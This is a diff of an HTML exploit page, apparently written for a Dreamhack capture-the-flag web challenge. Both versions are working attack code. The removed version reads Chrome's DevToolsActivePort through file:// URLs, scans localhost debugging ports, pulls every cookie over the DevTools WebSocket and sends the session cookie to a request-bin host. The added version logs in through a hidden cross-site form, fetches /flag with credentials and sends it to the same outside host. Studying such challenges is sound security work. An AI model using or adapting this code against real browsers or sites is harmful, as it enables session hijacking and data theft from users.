@@ -3,96 +3,30 @@
 <body>
 <script>
 (async () => {
+  const exfil = "https://yxozfwj.request.dreamhack.games";
   const username = "attacker";
   const password = "pw123";
-  const exfil = "https://qfoxzxf.request.dreamhack.games";
 
-  // log in via form navigation (keeps cookies first-party on 127.0.0.1)
-  fetch(exfil + "?step=start");
-  const portwin = window.open("file:///tmp/DevToolsActivePort", "portwin");
-  setTimeout(() => {
-    try {
-      portwin.location = `javascript:fetch('${exfil}?portdump='+encodeURIComponent(document.body.innerText))`;
-    } catch (e) {}
-  }, 120);
+  // 1) 로그인 (127.0.0.1 기준이라 admin 세션 생성)
   const form = document.createElement("form");
   form.action = "http://127.0.0.1:3000/login";
   form.method = "POST";
-  form.target = "loginwin";
+  form.target = "hiddenwin";
   form.innerHTML = `<input name="username" value="${username}"><input name="password" value="${password}">`;
   document.body.appendChild(form);
-  window.open("about:blank", "loginwin");
+  window.open("about:blank", "hiddenwin");
   form.submit();
 
+  // 2) 세션 생성 후 플래그 요청 -> 그대로 리퀘스트빈으로 프록시
   setTimeout(async () => {
-    fetch(exfil + "?step=afterlogin");
-    let wsUrl = "";
-    const candidates = [
-      "file:///tmp/DevToolsActivePort",
-      "file:///home/user/.config/google-chrome/Default/DevToolsActivePort",
-      "file:///home/user/.config/chromium/Default/DevToolsActivePort",
-      "file:///proc/self/cmdline"
-    ];
     try {
-      const listing = await fetch("file:///tmp/").then(r => r.text());
-      const dirMatch = listing.match(/\.(org\.chromium\.Chromium|com\.google\.Chrome)[^/]*\//);
-      if (dirMatch) {
-        candidates.unshift(`file:///tmp/${dirMatch[0]}DevToolsActivePort`);
-      }
-    } catch (e) {}
-    for (const path of candidates) {
-      try {
-        const txt = await fetch(path).then(r => r.text());
-        if (path.includes("cmdline")) {
-          fetch(exfil + `?cmd=${encodeURIComponent(txt.slice(0, 150))}`);
-          continue;
-        }
-        const parts = txt.trim().split("\n");
-        if (parts[0]) {
-          wsUrl = `ws://127.0.0.1:${parts[0].trim()}/devtools/browser/${parts[1] || ""}`;
-          fetch(exfil + `?portfile=${encodeURIComponent(parts[0])}`);
-          break;
-        }
-      } catch (e) {}
+      const flag = await fetch("http://127.0.0.1:3000/flag", { credentials: "include", mode: "cors" })
+        .then(r => r.text());
+      await fetch(`${exfil}?f=${encodeURIComponent(flag)}`);
+    } catch (e) {
+      fetch(`${exfil}?err=${encodeURIComponent(e.message || "fail")}`);
     }
-
-    if (!wsUrl) {
-      const ports = [
-        9222, 9223, 9224, 9225, 9226, 9227, 9228, 9229, 9230, 9231,
-        9232, 9233, 9234, 9235, 9236, 9237, 9238, 9239, 9240, 9515,
-        29990, 29991, 29992, 29993, 29994, 29995, 29996, 29997, 29998, 29999
-      ];
-      for (const port of ports) {
-        const controller = new AbortController();
-        setTimeout(() => controller.abort(), 30);
-        try {
-          const info = await fetch(`http://127.0.0.1:${port}/json/version`, { signal: controller.signal })
-            .then(r => r.json());
-          if (info && info.webSocketDebuggerUrl) {
-            wsUrl = info.webSocketDebuggerUrl;
-            fetch(exfil + `?port=${port}`);
-            fetch(exfil + "?step=haveinfo");
-            break;
-          }
-        } catch (e) {
-          fetch(exfil + `?fail=${port}`);
-        }
-      }
-      if (!wsUrl) { fetch(exfil + "?step=noinfo"); return; }
-    }
-
-    if (!wsUrl) return;
-    const ws = new WebSocket(wsUrl);
-    ws.onopen = () => ws.send(JSON.stringify({ id: 1, method: "Network.getAllCookies" }));
-    ws.onmessage = evt => {
-      try {
-        const data = JSON.parse(evt.data);
-        if (!data.result || !data.result.cookies) return;
-        const cookie = data.result.cookies.find(c => c.name === "session");
-        if (cookie) fetch(`${exfil}?c=${encodeURIComponent(cookie.value)}`); else fetch(exfil + "?step=nocookie");
-      } catch (e) {}
-    };
-  }, 50);
+  }, 400);
 })();
 </script>
 </body>
